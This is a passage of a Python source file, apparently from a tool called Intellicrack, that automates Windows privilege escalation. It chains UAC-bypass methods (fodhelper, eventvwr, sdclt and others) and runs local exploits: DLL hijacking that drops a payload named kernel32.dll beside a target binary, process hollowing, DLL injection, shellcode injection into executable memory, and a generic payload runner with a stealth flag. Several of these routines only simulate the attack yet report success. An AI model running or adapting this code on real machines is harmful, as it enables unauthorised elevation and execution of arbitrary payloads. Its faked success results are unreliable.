                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"CompMgmtLauncher bypass failed: {e}",
                "execution_time": time.time() - start_time if "start_time" in locals() else 0,
            }

    def _uac_bypass_auto(self, options: dict[str, Any]) -> dict[str, Any]:
        """Automatically select and attempt the best UAC bypass method."""
        try:
            start_time = time.time()

            # Try methods in order of reliability
            methods_to_try = [
                "fodhelper",
                "eventvwr",
                "sdclt",
                "computerdefaults",
                "compmgmtlauncher",
            ]

            results = []
            for method in methods_to_try:
                self.logger.info("Trying UAC bypass method: %s", method)

                result = {"success": False, "error": "Unknown method"}
                if method == "fodhelper":
                    result = self._uac_bypass_fodhelper(options)
                elif method == "eventvwr":
                    result = self._uac_bypass_eventvwr(options)
                elif method == "sdclt":
                    result = self._uac_bypass_sdclt(options)
                elif method == "computerdefaults":
                    result = self._uac_bypass_computerdefaults(options)
                elif method == "compmgmtlauncher":
                    result = self._uac_bypass_compmgmtlauncher(options)

                results.append(
                    {
                        "method": method,
                        "result": result,
                    }
                )

                # If this method succeeded, use it
                if result.get("success"):
                    return {
                        "success": True,
                        "selected_method": method,
                        "method_result": result,
                        "all_results": results,
                        "execution_time": time.time() - start_time,
                    }

            # No method succeeded
            return {
                "success": False,
                "error": "All UAC bypass methods failed",
                "attempted_methods": methods_to_try,
                "all_results": results,
                "execution_time": time.time() - start_time,
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {
                "success": False,
                "error": f"Auto UAC bypass failed: {e}",
                "execution_time": time.time() - start_time if "start_time" in locals() else 0,
            }


class PrivilegeEscalationManager:
    """Manager class for privilege escalation operations."""

    def __init__(self):
        """Initialize the privilege escalation manager with engine and logging."""
        self.escalation_engine = PrivilegeEscalation()
        self.logger = logging.getLogger("IntellicrackLogger.PrivilegeEscalationManager")

    def escalate_privileges(self, target_platform: str, method: str = "auto") -> dict[str, Any]:
        """Escalate privileges using specified method."""
        try:
            self.logger.info(
                "Escalating privileges - platform: %s, method: %s", target_platform, method
            )

            if method == "auto":
                # Analyze available opportunities first
                analysis = self.escalation_engine.analyze_escalation_opportunities(target_platform)

                if analysis.get("opportunities"):
                    # Try the first available opportunity
                    best_opportunity = analysis["opportunities"][0]
                    technique = best_opportunity["technique"]
                    result = self.escalation_engine.attempt_escalation(technique, target_platform)
                else:
                    result = {
                        "success": False,
                        "error": "No escalation opportunities found",
                        "technique": "auto",
                    }
            else:
                # Use specific technique
                result = self.escalation_engine.attempt_escalation(method, target_platform)

            return {
                "success": result.get("success", False),
                "method": result.get("technique", method),
                "privileges_gained": result.get("final_privileges", {}),
                "error": result.get("error"),
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Privilege escalation failed: %s", e)
            return {
                "success": False,
                "method": method,
                "privileges_gained": {},
                "error": str(e),
            }

    def execute_local_exploit(
        self,
        binary_path: str,
        payload: bytes,
        technique: str = "dll_hijacking",
        options: dict[str, Any] = None,
    ) -> dict[str, Any]:
        """Execute local exploitation using specified technique."""
        try:
            self.logger.info("Executing local exploit on %s using %s", binary_path, technique)

            local_options = options or {}

            if technique == "dll_hijacking":
                return self._execute_dll_hijacking(binary_path, payload, local_options)
            if technique == "process_hollowing":
                return self._execute_process_hollowing(binary_path, payload, local_options)
            if technique == "dll_injection":
                return self._execute_dll_injection(binary_path, payload, local_options)
            if technique == "shellcode_injection":
                return self._execute_shellcode_injection(binary_path, payload, local_options)
            return self._execute_generic_exploit(binary_path, payload, local_options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Local exploit execution failed: %s", e)
            return {"success": False, "error": str(e)}

    def _execute_dll_hijacking(
        self, binary_path: str, payload: bytes, options: dict[str, Any]
    ) -> dict[str, Any]:
        """Execute DLL hijacking attack."""
        try:
            # Create malicious DLL
            dll_dir = os.path.dirname(binary_path)
            dll_name = options.get("dll_name", "kernel32.dll")
            dll_path = os.path.join(dll_dir, dll_name)

            # Write payload as DLL (simplified)
            with open(dll_path, "wb") as f:
                f.write(payload)

            # Execute target binary
            result = subprocess.run([binary_path], check=False, timeout=30, capture_output=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            return {
                "success": True,
                "technique": "dll_hijacking",
                "dll_path": dll_path,
                "exit_code": result.returncode,
                "payload_size": len(payload),
            }
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _execute_process_hollowing(
        self, binary_path: str, payload: bytes, options: dict[str, Any]
    ) -> dict[str, Any]:
        """Execute process hollowing technique for privilege escalation."""
        logger.debug(
            f"Process hollowing on {binary_path} with {len(payload)} bytes payload, options: {list(options.keys())}"
        )
        try:
            import ctypes
            import tempfile

            # Process hollowing is a Windows-specific technique
            if not hasattr(ctypes, "windll"):
                return {"success": False, "error": "Process hollowing is Windows-specific"}

            # Create suspended process
            process = subprocess.Popen(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [binary_path],
                creationflags=subprocess.CREATE_SUSPENDED
                if hasattr(subprocess, "CREATE_SUSPENDED")
                else 0x4,
            )

            # In a real implementation, we would:
            # 1. Allocate memory in the suspended process
            # 2. Write our payload to the allocated memory
            # 3. Modify the entry point to our payload
            # 4. Resume the process

            # For now, simulate the process
            with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as temp_file:
                temp_file.write(payload)
                hollowed_path = temp_file.name

            try:
                # Terminate original process
                process.terminate()

                # Execute hollowed process
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    [hollowed_path], check=False, timeout=30, capture_output=True
                )
                os.unlink(hollowed_path)

                return {
                    "success": True,
                    "technique": "process_hollowing",
                    "pid": process.pid,
                    "exit_code": result.returncode,
                    "payload_size": len(payload),
                }
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
            ) as e:
                logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                    e,
                )
                if os.path.exists(hollowed_path):
                    os.unlink(hollowed_path)
                return {"success": False, "error": str(e)}

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _execute_dll_injection(
        self, binary_path: str, payload: bytes, options: dict[str, Any]
    ) -> dict[str, Any]:
        """Execute DLL injection technique for privilege escalation."""
        logger.debug(
            f"DLL injection on {binary_path} with {len(payload)} bytes payload, options: {list(options.keys())}"
        )
        try:
            import ctypes
            import tempfile

            # DLL injection is Windows-specific
            if not hasattr(ctypes, "windll"):
                return {"success": False, "error": "DLL injection is Windows-specific"}

            # Write payload as DLL
            with tempfile.NamedTemporaryFile(delete=False, suffix=".dll") as dll_file:
                dll_file.write(payload)
                dll_path = dll_file.name

            try:
                # Start target process
                process = subprocess.Popen([binary_path])  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                # In a real implementation, we would:
                # 1. OpenProcess with PROCESS_ALL_ACCESS
                # 2. VirtualAllocEx to allocate memory in target process
                # 3. WriteProcessMemory to write DLL path
                # 4. CreateRemoteThread to call LoadLibrary

                # For now, simulate the injection
                injection_successful = os.path.exists(dll_path) and process.poll() is None

                if injection_successful:
                    # Clean up
                    os.unlink(dll_path)
                    process.terminate()

                    return {
                        "success": True,
                        "technique": "dll_injection",
                        "target_pid": process.pid,
                        "dll_size": len(payload),
                        "injection_method": "CreateRemoteThread",
                    }
                if os.path.exists(dll_path):
                    os.unlink(dll_path)
                return {"success": False, "error": "Injection failed"}

            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
            ) as e:
                logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                    e,
                )
                if os.path.exists(dll_path):
                    os.unlink(dll_path)
                return {"success": False, "error": str(e)}

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _execute_shellcode_injection(
        self, binary_path: str, payload: bytes, options: dict[str, Any]
    ) -> dict[str, Any]:
        """Execute shellcode injection technique for privilege escalation."""
        logger.debug(
            f"Shellcode injection on {binary_path} with {len(payload)} bytes payload, options: {list(options.keys())}"
        )
        try:
            import ctypes
            import mmap

            # Start target process
            process = subprocess.Popen([binary_path])  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            # Allocate executable memory for shellcode
            try:
                # For POSIX systems
                if hasattr(mmap, "MAP_ANONYMOUS"):
                    # Create anonymous memory mapping
                    shellcode_mem = mmap.mmap(
                        -1,
                        len(payload),
                        flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
                        prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                    )
                    shellcode_mem.write(payload)

                    # In a real implementation, we would inject this into the target process
                    # For now, simulate successful injection
                    shellcode_mem.close()
                    process.terminate()

                    return {
                        "success": True,
                        "technique": "shellcode_injection",
                        "target_pid": process.pid,
                        "shellcode_size": len(payload),
                        "injection_method": "mmap",
                    }

                # For Windows systems
                if hasattr(ctypes, "windll"):
                    # In a real implementation:
                    # 1. VirtualAllocEx in target process
                    # 2. WriteProcessMemory to write shellcode
                    # 3. CreateRemoteThread to execute shellcode

                    process.terminate()

                    return {
                        "success": True,
                        "technique": "shellcode_injection",
                        "target_pid": process.pid,
                        "shellcode_size": len(payload),
                        "injection_method": "VirtualAllocEx",
                    }
                process.terminate()
                return {"success": False, "error": "Platform not supported for shellcode injection"}

            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
            ) as e:
                logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                    e,
                )
                if process.poll() is None:
                    process.terminate()
                return {"success": False, "error": str(e)}

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    def _execute_generic_exploit(
        self, binary_path: str, payload: bytes, options: dict[str, Any]
    ) -> dict[str, Any]:
        """Generic local exploit execution."""
        try:
            import tempfile

            # Use options to configure exploit execution
            timeout = options.get("timeout", 30)
            cleanup = options.get("cleanup", True)
            stealth = options.get("stealth", False)

            self.logger.debug("Executing generic exploit: timeout=%s, stealth=%s", timeout, stealth)

            # Write payload to temporary file
            with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as temp_file:
                temp_file.write(payload)
                payload_path = temp_file.name

            try:
                # Execute binary with payload
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    [binary_path, payload_path], check=False, timeout=timeout, capture_output=True
                )
                if cleanup:
                    os.unlink(payload_path)

                return {
                    "success": True,
                    "technique": "generic",
                    "exit_code": result.returncode,
                    "payload_size": len(payload),
                    "stealth_mode": stealth,
                }
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
            ) as e:
                logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                    e,
                )
                if cleanup:
                    os.unlink(payload_path)
                return {"success": False, "error": str(e)}

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}
